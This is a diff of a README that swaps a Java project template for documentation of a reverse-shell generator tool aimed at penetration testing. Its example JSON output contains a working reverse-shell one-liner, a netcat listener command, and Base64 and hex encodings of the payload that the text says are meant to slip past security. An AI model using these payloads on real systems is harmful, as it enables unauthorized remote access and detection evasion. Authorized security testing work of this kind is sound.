@@ -1,18 +1,33 @@
-## Getting Started
+## Reverse Shell Generaor
 
-Welcome to the VS Code Java world. Here is a guideline to help you get started to write Java code in Visual Studio Code.
+This tool help you to generate reverse shells for many purposes, mostly related with penetration testing.
 
-## Folder Structure
+To execute the `Reverse-Shell-Generator.jar` executable, you need to run from the terminal:
+```shell
+java -jar --enable-preview Reverse-Shell-Generator.jar
+```
 
-The workspace contains two folders by default, where:
+You can interact with the GUI and you'll get a reverse shell and a listener code to run with your own needs.
 
-- `src`: the folder to maintain sources
-- `lib`: the folder to maintain dependencies
+The output is as a JSON Object, and give you all the info and code that you maybe need, like IP, Port, if root permissions are required and the differents codes.
 
-Meanwhile, the compiled output files will be generated in the `bin` folder by default.
+The Reverse code is given in plain text, Base 64 encode and Hex encode, because maybe there are security when a payload is sent.
 
-> If you want to customize the folder structure, open `.vscode/settings.json` and update the related settings there.
+Example JSON Output:
 
-## Dependency Management
+```json
+{
+  "parameters": {
+    "localIP": "10.10.10.10",
+    "localPort": 80,
+    "requireRootPermission": true
+  },
+  "reverse_listener_code": "sudo nc -lvnp 80",
+  "reverse_shell_code": "sh -i >& /dev/tcp/10.10.10.10/80 0>&1",
+  "reverse_shell_code_b64": "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvODAgMD4mMQ==",
+  "reverse_shell_code_hex": "7368202d69203e26202f6465762f7463702f31302e31302e31302e31302f383020303e2631"
+}
+```
 
-The `JAVA PROJECTS` view allows you to manage your dependencies. More details can be found [here](https://github.com/microsoft/vscode-java-dependency#manage-dependencies).
+GUI:
+![Reverse Shell Generator's GUI](images/gui.png)
